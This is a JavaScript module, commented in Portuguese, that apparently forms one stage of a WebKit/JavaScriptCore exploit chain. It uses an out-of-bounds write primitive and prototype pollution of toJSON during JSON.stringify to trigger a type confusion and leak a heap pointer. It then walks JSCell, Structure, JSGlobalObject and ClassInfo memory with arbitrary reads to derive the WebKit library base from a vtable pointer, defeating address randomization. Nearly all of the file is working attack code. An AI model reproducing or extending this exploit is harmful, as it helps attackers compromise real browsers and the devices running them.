// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43m - Structure Walk)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite, // Mantemos os sanity checks
} from '../core_exploit.mjs';
// Importando os offsets que serão cruciais para a nova estratégia
import { JSC_OFFSETS } from '../config.mjs'; 

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";

const VICTIM_BUFFER_SIZE = 256; 
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUES_V82 = [0xABABABAB]; 

const PROBE_CALL_LIMIT_V82 = 10;

// O alvo do nosso vazamento de ponteiro inicial
let leakTarget = { marker: 0x42424242, value: Date.now() };

function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low === 0) return false;    
    if ((high & 0x7FF00000) === 0x7FF00000) return false; 
    if (high === 0 && low < 0x10000) return false;
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { // Nome da função mantido
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43m`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: TC + Pointer Leak + Structure Walk ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init...`;

    logS3(`--- Fase 0 (R43m): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
    logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
    if (!coreOOBReadWriteOK) {
        logS3("AVISO CRÍTICO: selfTestOOBReadWrite falhou. arb_read é instável. Abortando.", "critical", FNAME_CURRENT_TEST_BASE);
        return { errorOccurred: "selfTestOOBReadWrite 64bit failed" };
    }
    await PAUSE_S3(100);

    let final_result = {
        errorOccurred: null,
        tc_confirmed: false,
        pointer_leak: { success: false, msg: "Not run.", leaked_ptr: null },
        structure_walk: { success: false, msg: "Not run.", global_object_addr: null },
        webkit_leak: { success: false, msg: "Not run.", webkit_base: null, vtable_ptr: null }
    };

    // Apenas uma iteração, já que a TC é estável e a falha do addrof não era aleatória.
    const current_oob_value = OOB_WRITE_VALUES_V82[0]; 
    const current_oob_hex_val = toHex(current_oob_value);
    const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${current_oob_hex_val}`;
    logS3(`\n===== Tentativa Única (R43m): OOB Write Value: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);

    let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
    let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
    let heisenbugConfirmedThisIter = false;
    let initialLeakedPtr = null;

    // Sonda toJSON focada em criar uma oportunidade de vazar um ponteiro para o buffer
    function toJSON_TA_Probe_Iter_Closure_R43m() {
        probe_call_count_iter++; const call_num = probe_call_count_iter; const ctts = Object.prototype.toString.call(this);
        const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && ctts === '[object Object]');
        
        try {
            if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
            if (call_num === 1 && this === victim_typed_array_ref_iter) {
                marker_M2_ref_iter = { marker_id_v82: "M2_Iter_R43m" }; 
                marker_M1_ref_iter = { marker_id_v82: "M1_Iter_R43m", payload_M2: marker_M2_ref_iter };
                return marker_M1_ref_iter;
            } else if (is_m2c) { 
                if (!heisenbugConfirmedThisIter) {
                    heisenbugConfirmedThisIter = true;
                    logS3(`[PROBE_R43m] Call #${call_num} (M2C): FIRST TC. Tentando plantar ponteiro...`, "vuln");
                    // Tenta plantar um ponteiro em uma propriedade do objeto confundido.
                    // A esperança é que a memória deste objeto sobreponha o victim_typed_array_ref_iter.buffer.
                    this.leakedPtrSlot = leakTarget; 
                }
                return this; 
            }
        } catch (e_pm) {
            logS3(`[PROBE_R43m] Erro na sonda: ${e_pm.message}`, "error", FNAME_CURRENT_ITERATION);
            final_result.errorOccurred = `Probe Error: ${e_pm.message}`;
            return { err_pm: call_num, msg: e_pm.message };
        }
        return { gen_m: call_num, type: ctts };
    }

    try {
        // --- FASE 1: VAZAMENTO DE PONTEIRO ---
        logS3(`  --- Fase 1 (R43m): TC + Vazamento de Ponteiro Inicial ---`, "subtest", FNAME_CURRENT_ITERATION);
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
        await PAUSE_S3(150);
        victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        
        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_R43m, writable: true, configurable: true, enumerable: false });
            polluted = true;
            JSON.stringify(victim_typed_array_ref_iter);
        } catch (e_str) {
            logS3(`  TC/Addrof Probe R43m: JSON.stringify EXCEPTION: ${e_str.message}`, "error");
            if (!final_result.errorOccurred) final_result.errorOccurred = `Stringify Error: ${e_str.message}`;
        } finally {
            if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; }
        }

        final_result.tc_confirmed = heisenbugConfirmedThisIter;
        if (!heisenbugConfirmedThisIter) {
            throw new Error("Falha ao confirmar a Type Confusion. Abortando.");
        }

        // Agora, verificar se a propriedade 'leakedPtrSlot' escreveu o ponteiro em nosso buffer
        let uint32_view = new Uint32Array(victim_typed_array_ref_iter.buffer);
        for (let i = 0; i < (uint32_view.length - 1); i++) {
            let potential_addr = new AdvancedInt64(uint32_view[i], uint32_view[i + 1]);
            if (isValidPointer(potential_addr, "_initialLeakScan")) {
                // Para confirmar, podemos tentar ler do ponteiro candidato com arb_read
                try {
                    const structurePtr = await arb_read(potential_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
                    if (isValidPointer(structurePtr, "_structPtrCheck")) {
                        initialLeakedPtr = potential_addr;
                        final_result.pointer_leak.success = true;
                        final_result.pointer_leak.leaked_ptr = initialLeakedPtr.toString(true);
                        final_result.pointer_leak.msg = `Ponteiro inicial para JSCell vazado com sucesso em offset 0x${(i * 4).toString(16)}!`;
                        logS3(`[PointerLeak] SUCESSO! ${final_result.pointer_leak.msg} Addr: ${final_result.pointer_leak.leaked_ptr}`, "vuln", FNAME_CURRENT_ITERATION);
                        break; // Sai do loop ao encontrar o primeiro ponteiro válido
                    }
                } catch (e_read_check) { /* Ignora, continua procurando */ }
            }
        }
        if (!final_result.pointer_leak.success) {
            final_result.pointer_leak.msg = "Ponteiro não foi encontrado no buffer da vítima após a TC.";
            throw new Error(final_result.pointer_leak.msg);
        }
        logS3(`  --- Fase 1 (R43m) Concluída. Sucesso: ${final_result.pointer_leak.success} ---`, "subtest");
        await PAUSE_S3(100);

        // --- FASE 2: NAVEGAÇÃO DE ESTRUTURAS (STRUCTURE WALK) ---
        logS3(`  --- Fase 2 (R43m): Navegação de Estruturas para encontrar JSGlobalObject ---`, "subtest", FNAME_CURRENT_ITERATION);
        let global_object_addr = null;
        try {
            const structure_addr = await arb_read(initialLeakedPtr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
            if (!isValidPointer(structure_addr, "_structureAddr")) throw new Error("Ponteiro para Structure inválido.");
            logS3(`[StructureWalk] Endereço da Structure: ${structure_addr.toString(true)}`, "leak");

            global_object_addr = await arb_read(structure_addr.add(JSC_OFFSETS.Structure.GLOBAL_OBJECT_OFFSET), 8);
            if (!isValidPointer(global_object_addr, "_globalObjectAddr")) throw new Error("Ponteiro para JSGlobalObject inválido.");

            final_result.structure_walk.success = true;
            final_result.structure_walk.global_object_addr = global_object_addr.toString(true);
            final_result.structure_walk.msg = `Endereço do JSGlobalObject obtido com sucesso!`;
            logS3(`[StructureWalk] SUCESSO! ${final_result.structure_walk.msg} Addr: ${final_result.structure_walk.global_object_addr}`, "vuln", FNAME_CURRENT_ITERATION);

        } catch (e_struct_walk) {
            final_result.structure_walk.msg = `EXCEPTION: ${e_struct_walk.message}`;
            throw new Error(`Falha na Fase 2 (Structure Walk): ${e_struct_walk.message}`);
        }
        logS3(`  --- Fase 2 (R43m) Concluída. Sucesso: ${final_result.structure_walk.success} ---`, "subtest");
        await PAUSE_S3(100);


        // --- FASE 3: VAZAMENTO DA BASE DO WEBKIT ---
        logS3(`  --- Fase 3 (R43m): Vazamento da Base do WebKit a partir do JSGlobalObject ---`, "subtest", FNAME_CURRENT_ITERATION);
        try {
            const global_obj_structure_addr = await arb_read(global_object_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
            if (!isValidPointer(global_obj_structure_addr, "_globalStructAddr")) throw new Error("Ponteiro para Structure do JSGlobalObject inválido.");
            logS3(`[WebKitLeak] Endereço da Structure do JSGlobalObject: ${global_obj_structure_addr.toString(true)}`, "leak");

            const class_info_addr = await arb_read(global_obj_structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET), 8);
            if (!isValidPointer(class_info_addr, "_classInfoAddr")) throw new Error("Ponteiro para ClassInfo inválido.");
            logS3(`[WebKitLeak] Endereço do ClassInfo: ${class_info_addr.toString(true)}`, "leak");
            
            // A vtable é geralmente o primeiro ponteiro dentro da estrutura ClassInfo.
            const vtable_ptr = await arb_read(class_info_addr, 8);
            if (!isValidPointer(vtable_ptr, "_vtablePtr")) throw new Error("Ponteiro para vtable inválido.");
            final_result.webkit_leak.vtable_ptr = vtable_ptr.toString(true);
            logS3(`[WebKitLeak] Ponteiro para vtable: ${final_result.webkit_leak.vtable_ptr}`, "leak");

            // Alinhar para uma página de 4KB (0x1000) ou 1MB (0x100000) para encontrar a base.
            // O alinhamento exato pode variar. 4KB é um bom começo.
            const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF); 
            const webkit_base_candidate = vtable_ptr.and(page_mask_4kb); 
            
            final_result.webkit_leak.webkit_base = webkit_base_candidate.toString(true);
            final_result.webkit_leak.success = true;
            final_result.webkit_leak.msg = `Candidato a base do WebKit (a partir da vtable do JSGlobalObject): ${final_result.webkit_leak.webkit_base}`;
            logS3(`[WebKitLeak] SUCESSO! ${final_result.webkit_leak.msg}`, "vuln");

            document.title = `${FNAME_CURRENT_TEST_BASE}_SUCCESS!`;

        } catch(e_webkit_leak) {
            final_result.webkit_leak.msg = `EXCEPTION: ${e_webkit_leak.message}`;
            if (!final_result.errorOccurred) final_result.errorOccurred = `WebKit Leak Error: ${e_webkit_leak.message}`;
            logS3(`  WebKitLeak: ERRO - ${final_result.webkit_leak.msg}`, "error");
        }

    } catch (e_outer) {
        if (!final_result.errorOccurred) final_result.errorOccurred = `Erro geral: ${e_outer.message}`;
        logS3(`  CRITICAL ERROR na execução (R43L): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_ITERATION);
        console.error("Outer error in R43L:", e_outer);
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR43L` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R43L): ${JSON.stringify(final_result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return final_result; // Retorna um objeto de resultado único e simplificado
}
